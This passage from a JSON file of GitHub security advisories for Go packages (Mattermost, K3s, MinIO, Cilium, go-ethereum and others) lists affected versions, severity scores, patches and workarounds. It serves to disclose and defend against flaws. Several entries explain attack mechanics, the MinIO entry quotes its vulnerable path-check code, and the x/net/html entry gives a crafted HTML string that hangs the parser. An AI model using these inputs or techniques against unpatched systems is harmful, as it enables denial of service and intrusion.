user edit permissions to manage/update bots.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.1"}]}], "versions": ["8.1.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5159"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-09-29T20:41:31Z", "nvd_published_at": "2023-09-29T10:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r5hm-mp3j-285g", "modified": "2023-09-26T19:35:39Z", "published": "2023-09-26T19:35:39Z", "aliases": ["CVE-2023-43644"], "summary": "sing-box vulnerable to improper authentication in the SOCKS inbound", "details": "### Impact\n\nThis vulnerability allows specially crafted requests to bypass authentication, affecting all SOCKS inbounds with user authentication.\n\n### Patches\n\nUpdate to sing-box 1.4.5 or 1.5.0-rc.5 and later versions.\n\n### Workarounds\n\nDon't expose the SOCKS5 inbound to insecure environments.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sagernet/sing-box"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/sagernet/sing-box"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0-beta.1"}, {"fixed": "1.5.0-rc.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/sagernet/sing"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.12-0.20230925092853-5b05b5c147d9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/SagerNet/sing-box/security/advisories/GHSA-r5hm-mp3j-285g"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43644"}, {"type": "WEB", "url": "https://github.com/SagerNet/sing-box/commit/9891fd672f5da9f20f59a1693271a946727f49e2"}, {"type": "WEB", "url": "https://github.com/SagerNet/sing/commit/5b05b5c147d9650e8accb4441e216c72a61f4859"}, {"type": "PACKAGE", "url": "https://github.com/SagerNet/sing-box"}, {"type": "WEB", "url": "https://github.com/SagerNet/sing-box/releases/tag/v1.4.5"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-26T19:35:39Z", "nvd_published_at": "2023-09-25T20:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2g7r-9xq5-c6hv", "modified": "2023-09-20T21:29:25Z", "published": "2023-09-18T06:30:14Z", "aliases": ["CVE-2023-5036"], "summary": "Cross-Site Request Forgery (CSRF) in  usememos/memos", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos prior to 0.15.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5036"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/97b434722cf0abe3cfcad5ac9e3d520233bf1536"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/46881df7-eb41-4ce2-a78f-82de9bc4fc2d"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-18T19:18:55Z", "nvd_published_at": "2023-09-18T06:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-92hx-3mh6-hc49", "modified": "2023-09-25T18:32:19Z", "published": "2023-09-24T03:30:20Z", "aliases": ["CVE-2023-1260"], "summary": "kube-apiserver authentication bypass vulnerability", "details": "An authentication bypass vulnerability was discovered in kube-apiserver. This issue could allow a remote, authenticated attacker who has been given permissions \"update, patch\" the \"pods/ephemeralcontainers\" subresource beyond what the default is. They would then need to create a new pod or patch one that they already have access to. This might allow evasion of SCC admission restrictions, thereby gaining control of a privileged pod.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/apiserver-library-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20230621"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1260"}, {"type": "WEB", "url": "https://github.com/openshift/apiserver-library-go/commit/a994128188486d2dce99a528fbcc017d276081e0"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:3976"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:4093"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:4312"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:4898"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2023-1260"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2176267"}, {"type": "PACKAGE", "url": "https://github.com/openshift/apiserver-library-go"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231020-0010/"}], "database_specific": {"cwe_ids": ["CWE-288"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-25T18:32:19Z", "nvd_published_at": "2023-09-24T01:15:42Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vpjc-4jcv-jc29", "modified": "2023-09-21T17:09:04Z", "published": "2023-09-19T03:30:34Z", "aliases": ["CVE-2022-28357"], "summary": "NATS nats-server allows directory traversal via unintended path to a management action ", "details": "NATS nats-server 2.2.0 through 2.7.4 allows directory traversal because of an unintended path to a management action from a management account.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-28357"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2022-28357.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/nats-server"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases/tag/v2.7.4"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-21T17:09:04Z", "nvd_published_at": "2023-09-19T02:15:54Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m4hf-6vgr-75r2", "modified": "2023-09-20T21:09:28Z", "published": "2023-09-11T13:47:08Z", "aliases": ["CVE-2023-32187"], "summary": "K3s apiserver port is vulnerable to unauthenticated remote denial-of-service (DoS) attack via TLS SAN stuffing attack", "details": "### Impact\n\nAn issue was found in K3s where an attacker with network access to K3s servers' apiserver/supervisor port (TCP 6443) can force the TLS server to add entries to the certificate's Subject Alternative Name (SAN) list, through a stuffing attack, until the certificate grows so large that it exceeds the maximum size allowed by TLS client implementations. OpenSSL for example will raise an `excessive message size` error when this occurs. No authentication is necessary to perform this attack, only the ability to perform a TLS handshake against the apiserver/supervisor port (TCP 6443).\n\nAffected servers will continue to operate, but clients (including both external administrative access with `kubectl` and server or agent nodes) will fail to establish new connections, thus leading to a denial of service (DoS) attack.\n\n### Remediation\n\nUpgrade to a fixed release:\n\n- v1.28.1+k3s1\n- v1.27.5+k3s1\n- v1.26.8+k3s1\n- v1.25.13+k3s1\n- v1.24.17+k3s1\n\nIf you are using K3s 1.27 or earlier, you must also add  the parameter `tls-san-security: true` to the K3s configuration to enable enhanced security for the supervisor's TLS SAN list. This option defaults to `true` starting with K3s 1.28.\n\nNote that this flag changes the behavior of K3s servers. You should ensure that you configure `node-external-ip` on servers that will be connected to via an external IP, and add `tls-san` entries for any load-balancers or VIP addresses that will be associated with the supervisor port. External IPs and load-balancer/VIP addresses will no longer be added to the supervisor certificate's SAN list unless explicitly configured.\n\n### Mitigation\n\nIf you cannot upgrade to a fixed release, the certificate can be \"frozen\" by running the following command against the cluster:\n\n```shell\nkubectl annotate secret -n kube-system k3s-serving listener.cattle.io/static=true\n```\n\n**\u26a0\ufe0f IMPORTANT CAUTION:** Note that this mitigation will prevent the certificate from adding new SAN entries when servers join the cluster, and automatically renewing itself when it is about to expire. If you do this, you should delete the annotation when adding new servers to the cluster, or when the certificate is within 90 days of expiring, so that it can be updated. Once that is done, you can freeze it again.\n\nAffected certificates can be reset by performing the following steps:\n1. Run `kubectl --server https://localhost:6444 delete secret -n kube-system k3s-serving`\n2. Delete `/var/lib/rancher/k3s/server/tls/dynamic-cert.json` from all servers, and restart the `k3s` service.\n\n### Background\n\nThe K3s apiserver/supervisor listener on port TCP 6443 and uses the `rancher/dynamiclistener` library to dynamically generate TLS certificates that contain TLS Subject Alternative Names (SAN) for any host name or IP address requested by a client. This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in K3s.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [K3s Security team](https://github.com/k3s-io/k3s/security/policy) for security related inquiries.\n- Open an issue in the [K3s](https://github.com/k3s-io/k3s/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-k3s/support-matrix/all-supported-versions) and [product support lifecycle](https://www.suse.com/lifecycle/#k3s).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/k3s-io/k3s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/k3s-io/k3s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/k3s-io/k3s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/k3s-io/k3s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/k3s-io/k3s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.28.0"}, {"fixed": "1.28.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/k3s-io/k3s/security/advisories/GHSA-m4hf-6vgr-75r2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32187"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2023-32187https://"}, {"type": "PACKAGE", "url": "https://github.com/k3s-io/k3s"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-11T13:47:08Z", "nvd_published_at": "2023-09-18T13:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w23q-4hw3-2pp6", "modified": "2023-09-06T18:43:13Z", "published": "2023-09-06T18:43:13Z", "aliases": ["CVE-2023-28433"], "summary": "Minio vulnerable to Privilege Escalation on Windows via Path separator manipulation", "details": "### Impact\nAll users on Windows are impacted. MinIO fails to filter the `\\` character, which allows for arbitrary object placement across\nbuckets. As a result, a user with low privileges, such as an access key, service account, or STS credential, which only has permission to `PutObject` in a specific bucket, can create an admin user.\n\n### Patches\nThere are two patches that fix this problem comprehensively\n\n```\ncommit b3c54ec81e0a06392abfb3a1ffcdc80c6fbf6ebc\nAuthor: Harshavardhana <harsha@minio.io>\nDate:   Mon Mar 20 13:16:00 2023 -0700\n\n    reject object names with '\\' on windows (#16856)\n```\n\n```\ncommit 8d6558b23649f613414c8527b58973fbdfa4d1b8\nAuthor: Harshavardhana <harsha@minio.io>\nDate:   Mon Mar 20 00:35:25 2023 -0700\n\n    fix: convert '\\' to '/' on windows (#16852)\n```\n\n### Workarounds\nThere are no known workarounds\n\n### References\nThe vulnerable code:\n```go\n// minio/cmd/generic-handlers.go\n// Check if the incoming path has bad path components,\n// such as \"..\" and \".\"\n// SlashSeparator -> /\n// dotdotComponent -> ..\n// dotComponent -> .\nfunc hasBadPathComponent(path string) bool {\n  path = strings.TrimSpace(path)\n  for _, p := range strings.Split(path, SlashSeparator) {\n    switch strings.TrimSpace(p) {\n    case dotdotComponent:\n      return true\n    case dotComponent:\n      return true\n    }\n  }\n  return false\n}\n```\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/minio/minio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-202303200735"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/minio/minio/security/advisories/GHSA-w23q-4hw3-2pp6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28433"}, {"type": "WEB", "url": "https://github.com/minio/minio/commit/8d6558b23649f613414c8527b58973fbdfa4d1b8"}, {"type": "WEB", "url": "https://github.com/minio/minio/commit/b3c54ec81e0a06392abfb3a1ffcdc80c6fbf6ebc"}, {"type": "PACKAGE", "url": "https://github.com/minio/minio"}, {"type": "WEB", "url": "https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-06T18:43:13Z", "nvd_published_at": "2023-03-22T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6f4m-j56w-55c3", "modified": "2023-09-25T17:43:43Z", "published": "2023-09-23T21:30:17Z", "aliases": ["CVE-2022-3962"], "summary": "Kiali content spoofing vulnerability", "details": "A content spoofing vulnerability was found in Kiali. It was discovered that Kiali does not implement error handling when the page or endpoint being accessed cannot be found. This issue allows an attacker to perform arbitrary text injection when an error response is retrieved from the URL being accessed.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kiali/kiali"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.57.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3962"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/aab7694f850f04d7fd875fac5f720a93ccdf01ad"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:0542"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-3962"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2148661"}, {"type": "PACKAGE", "url": "https://github.com/kiali/kiali"}, {"type": "WEB", "url": "https://issues.redhat.com/browse/OSSM-2251?attachmentViewMode=list"}], "database_specific": {"cwe_ids": ["CWE-74"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-25T17:43:43Z", "nvd_published_at": "2023-09-23T20:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4xp2-w642-7mcx", "modified": "2023-10-02T20:13:42Z", "published": "2023-09-27T00:35:26Z", "aliases": ["CVE-2023-41333"], "summary": "Cilium vulnerable to bypass of namespace restrictions in CiliumNetworkPolicy ", "details": "### Impact\n\nAn attacker with the ability to create or modify CiliumNetworkPolicy objects in a particular namespace is able to affect traffic on an entire Cilium cluster, potentially bypassing policy enforcement in other namespaces.\n\nBy using a crafted `endpointSelector` that uses the `DoesNotExist` operator on the `reserved:init` label, the attacker can create policies that bypass namespace restrictions and affect the entire Cilium cluster. This includes potentially allowing or denying all traffic.\n\nThis attack requires API server access, as described in the [Kubernetes API Server Attacker](https://docs.cilium.io/en/stable/security/threat-model/#kubernetes-api-server-attacker) section of the Cilium Threat Model.\n\n### Patches\n\nThis issue was patched in https://github.com/cilium/cilium/pull/28007\n\nThis issue affects:\n\n- Cilium <= v1.14.1\n- Cilium <= v1.13.6\n- Cilium <= v1.12.13\n\nThis issue has been resolved in:\n\n- Cilium v1.14.2\n- Cilium v1.13.7\n- Cilium v1.12.14\n\n### Workarounds\n\nAn admission webhook can be used to prevent the use of `endpointSelector`s that use the `DoesNotExist` operator on the `reserved:init` label in CiliumNetworkPolicies.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Palantir and Isovalent to prepare these mitigations. Special thanks to @odinuge for reporting this issue and @joestringer for the fix.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nIf you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list at [security@cilium.io](mailto:security@cilium.io) first, before disclosing it in any public forum. This is a private mailing list for Cilium's internal security team, and your report will be treated as top priority. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.14"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-4xp2-w642-7mcx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41333"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/pull/28007"}, {"type": "WEB", "url": "https://docs.cilium.io/en/stable/security/threat-model/#kubernetes-api-server-attacker"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-27T00:35:26Z", "nvd_published_at": "2023-09-27T15:19:30Z"}}, {"schema_version": "1.4.0", "id": "GHSA-96gq-6ch5-mm54", "modified": "2023-09-01T21:48:47Z", "published": "2023-09-01T03:30:14Z", "aliases": ["CVE-2023-4698"], "summary": "usememos/memos vulnerable to improper input validation", "details": "Improper Input Validation in GitHub repository usememos/memos prior to 0.13.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 0.13.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4698"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9aa2eeb9852047e4f41915eb30726bd25f07ecd"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e1107d79-1d63-4238-90b7-5cc150512654"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-01T21:48:47Z", "nvd_published_at": "2023-09-01T01:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pj2h-85jq-g5vg", "modified": "2023-09-08T12:20:46Z", "published": "2023-09-07T09:30:15Z", "aliases": ["CVE-2023-4815"], "summary": "Answer Missing Authentication for Critical Function", "details": "Missing Authentication for Critical Function in GitHub repository answerdev/answer prior to v1.1.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4815"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/e75142a55546e01d8904f59db228422561f51666"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/4cd3eeb4-57c9-4af2-ad19-2166c9e0fd2c"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-08T12:20:46Z", "nvd_published_at": "2023-09-07T07:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ppjg-v974-84cm", "modified": "2023-11-08T17:39:39Z", "published": "2023-09-06T19:49:46Z", "aliases": ["CVE-2023-40591"], "summary": "Go-Ethereum vulnerable to denial of service via malicious p2p message", "details": "### Impact\n\nA vulnerable node, can be made to consume unbounded amounts of memory when handling specially crafted p2p messages sent from an attacker node.\n\n### Details\n\nThe p2p handler spawned a new goroutine to respond to `ping` requests. By flooding a node with ping requests, an unbounded number of goroutines can be created, leading to resource exhaustion and potentially crash due to OOM.\n\n### Patches\n\nThe fix is included in geth version `1.12.1-stable`, i.e, `1.12.2-unstable` and onwards. \n\nFixed by https://github.com/ethereum/go-ethereum/pull/27887\n\n### Workarounds\n\nNo known workarounds. \n\n### Credits\n\nThis bug was reported by Patrick McHardy and reported via [bounty@ethereum.org](mailto:bounty@ethereum.org). \n\n### References\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.1-stable"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-ppjg-v974-84cm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40591"}, {"type": "WEB", "url": "https://geth.ethereum.org/docs/developers/geth-developer/disclosures"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.12.1"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-06T19:49:46Z", "nvd_published_at": "2023-09-06T19:15:44Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5j6p-59cj-j6cp", "modified": "2023-09-01T21:48:39Z", "published": "2023-09-01T03:30:14Z", "aliases": ["CVE-2023-4697"], "summary": "usememos/memos vulnerable to privilege escalation", "details": "Improper Privilege Management in GitHub repository usememos/memos prior to 0.13.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4697"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9aa2eeb9852047e4f41915eb30726bd25f07ecd"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/3ff3325a-1dcb-4da7-894d-81a9cf726d81"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-01T21:48:39Z", "nvd_published_at": "2023-09-01T01:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfw5-hrgq-h5wf", "modified": "2023-09-25T17:33:10Z", "published": "2023-09-25T17:33:10Z", "aliases": ["CVE-2018-17846"], "summary": "x/net/html Vulnerable to DoS During HTML Parsing", "details": "The html package (aka x/net/html) through 2018-09-25 in Go mishandles `<table><math><select><mi><select></table>`, leading to an infinite loop during an `html.Parse` call because `inSelectIM` and `inSelectInTableIM` do not comply with a specification.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190125091013-d26f9f9a57f3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17846"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27842"}, {"type": "WEB", "url": "https://go-review.googlesource.com/c/137275"}, {"type": "WEB", "url": "https://go.dev/issue/27842"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/d26f9f9a57f3fab6a695bec0d84433c2c50f8bbf"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0014"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-25T17:33:10Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5crw-6j7v-xc72", "modified": "2023-09-08T13:18:23Z", "published": "2023-09-08T13:18:23Z", "aliases": ["CVE-2023-41318"], "summary": "matrix-media-repo: Unsafe media served inline on download endpoints", "details": "### Impact\nA malicious user can upload an SVG image containing JavaScript to their server. When matrix-media-repo is asked to serve that media via the `/_matrix/media/(r0|v3)/download` endpoint, it would be served with a `Content-Disposition` of `inline`. This can allow JavaScript to run in the browser if a client links to the `/download` endpoint directly.\n\nServer operators which do not share a domain between matrix-media-repo and other services are not affected, but are encouraged to upgrade regardless.\n\n### Patches\nhttps://github.com/turt2live/matrix-media-repo/commit/77ec2354e8f46d5ef149d1dcaf25f51c04149137 and https://github.com/turt2live/matrix-media-repo/commit/bf8abdd7a5371118e280c65a8e0ec2b2e9bdaf59 fix the issue. Operators should upgrade to v1.3.0 as soon as possible.\n\n### Workarounds\nThe `Content-Disposition` header can be overridden by the reverse proxy in front of matrix-media-repo to always use `attachment`, defeating this issue at the cost of \"worse\" user experience when clicking download links.\n\n### References\nhttps://developer.mozilla.org/en-US/docs/Web/SVG/Element/script\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/turt2live/matrix-media-repo"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/turt2live/matrix-media-repo/security/advisories/GHSA-5crw-6j7v-xc72"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41318"}, {"type": "WEB", "url": "https://github.com/turt2live/matrix-media-repo/commit/77ec2354e8f46d5ef149d1dcaf25f51c04149137"}, {"type": "WEB", "url": "https://github.com/turt2live/matrix-media-repo/commit/bf8abdd7a5371118e280c65a8e0ec2b2e9bdaf59"}, {"type": "WEB", "url": "https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script"}, {"type": "PACKAGE", "url": "https://github.com/turt2live/matrix-media-repo"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-08T13:18:23Z", "nvd_published_at": "2023-09-08T20:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-364c-vvqx-446c", "modified": "2023-09-22T19:43:27Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43620"], "summary": "Croc sender may place ANSI or CSI escape sequences in filename to attach receiver's terminal device", "details": "An issue was discovered in Croc through 9.6.5. A sender may place ANSI or CSI escape sequences in a filename to attack the terminal device of a receiver. ", "severity": [{"type": "CVSS_V3", "score": 